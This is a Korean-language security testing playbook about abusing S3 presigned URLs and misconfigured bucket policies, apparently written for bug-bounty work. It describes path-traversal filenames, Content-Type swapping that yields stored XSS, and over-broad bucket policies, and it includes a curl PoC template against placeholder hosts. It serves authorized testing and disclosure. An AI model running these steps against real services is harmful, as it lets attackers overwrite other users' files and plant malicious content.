# Scenario: S3 Presigned URL Abuse / Policy Misconfig

> presigned URL 생성 로직의 scope 누락 또는 bucket policy 결함으로 의도치 않은
> write/list/overwrite.

## 1. Threat Model
- **타겟**: S3-backed file upload/download (대부분 SaaS), 유사한 GCS/Azure Blob
- **공격자**: 저권한 인증 사용자 (자신의 upload URL 받음)
- **Impact**: 타 사용자 파일 overwrite, 버킷 전체 read, RCE (`.html` 호스팅 시)
- **Severity**: Medium–High

## 2. Discovery Signals
- `PUT https://bucket.s3.amazonaws.com/...?X-Amz-Signature=...` 패턴
- presigned URL이 상대 경로 또는 user-supplied filename 포함
- Content-Type 미지정 (공격자가 HTML 업로드 가능)
- `s3:PutObject` resource ARN이 `arn:aws:s3:::bucket/*` (너무 넓음)
- Subdomain takeover 가능한 CloudFront/S3 static site 설정

## 3. Exploit Chain

### 3.1 Path traversal in presigned URL
```
앱이 유저 파일명 그대로 사용:
POST /upload { filename: "../other-user/avatar.jpg" }
→ presigned URL에 resolved path 포함
→ 타 유저 파일 덮어쓰기 가능
```

### 3.2 Content-Type 탈취 → XSS / RCE-like
```
앱: presigned with Content-Type: image/jpeg
공격자: PUT 요청에서 Content-Type 변경 시도
→ 서버가 signed 값 검증 안하면 image/jpeg 아닌 html 저장
→ 직접 URL 접근 시 HTML 렌더링 → stored XSS
```

### 3.3 Bucket policy 과다 권한
```
aws s3api get-bucket-policy --bucket <b>
# Principal: "*" + s3:GetObject → 전체 read
# 또는 s3:ListBucket 공개 → 파일 목록 노출
```

### 3.4 Versioning ID 누락
```
presigned GET URL이 특정 version을 지정하지 않으면 latest 반환
→ 공격자가 PUT 이후 victim의 signed URL 접근 시 공격자 콘텐츠 반환
```

## 4. PoC Template
```bash
# 1. 자신의 presigned URL 획득
curl -X POST -H "Authorization: Bearer $LOW_TOKEN" \
  https://api.example/upload/presign \
  -d '{"filename":"test.jpg"}' | tee signed.json
URL=$(jq -r .url signed.json)

# 2. Content-Type 교체 시도
curl -X PUT -H "Content-Type: text/html" --data-binary @poc.html "$URL"
# 3. 직접 접근
curl https://bucket.example-cdn.com/test.jpg -i | head

# 4. Path traversal
curl -X POST -H "Authorization: Bearer $LOW_TOKEN" \
  https://api.example/upload/presign \
  -d '{"filename":"../victim-id/avatar.jpg"}'

# 5. Bucket policy 감사 (own buckets, authorized)
aws s3api get-bucket-policy --bucket $B
aws s3api get-bucket-acl --bucket $B
```

## 5. Evidence Tier
- E1: 두 테스트 계정 — 공격자 upload가 victim 경로에 저장된 것 확인 + victim이 자기 파일에서 공격자 콘텐츠 읽음
- E2: Content-Type 교체 성공 + 실제 브라우저 렌더 확인
- E3: bucket 과다 권한 정적 분석만

## 6. Gate 1 / Gate 2
- [ ] Filename 검증 우회가 server-side인지 client-side인지 구분
- [ ] presigned URL 자체의 signature 변조는 불가 — scope는 app이 전달한 값
- [ ] Subdomain takeover 결합 시 severity 상승하지만 별도 제보 고려

## 7. Variants
- **CloudFront origin 우회**: 직접 S3 URL로 signed check 우회
- **S3 Transfer Acceleration** 엔드포인트 차이
- **Multipart upload** 중 파트 replay
- **Object Lock / Legal Hold** 설정 결함
- **EventBridge/Lambda trigger** via 특정 prefix upload

## 8. References
- HackerOne 공개 disclosure 다수 (Dropbox, Shopify, Slack)
- AWS S3 보안 best practices 공식 문서
- flAWS / flAWS2 CTF 시리즈 (S3 기본)
- HackingTheCloud — S3 섹션
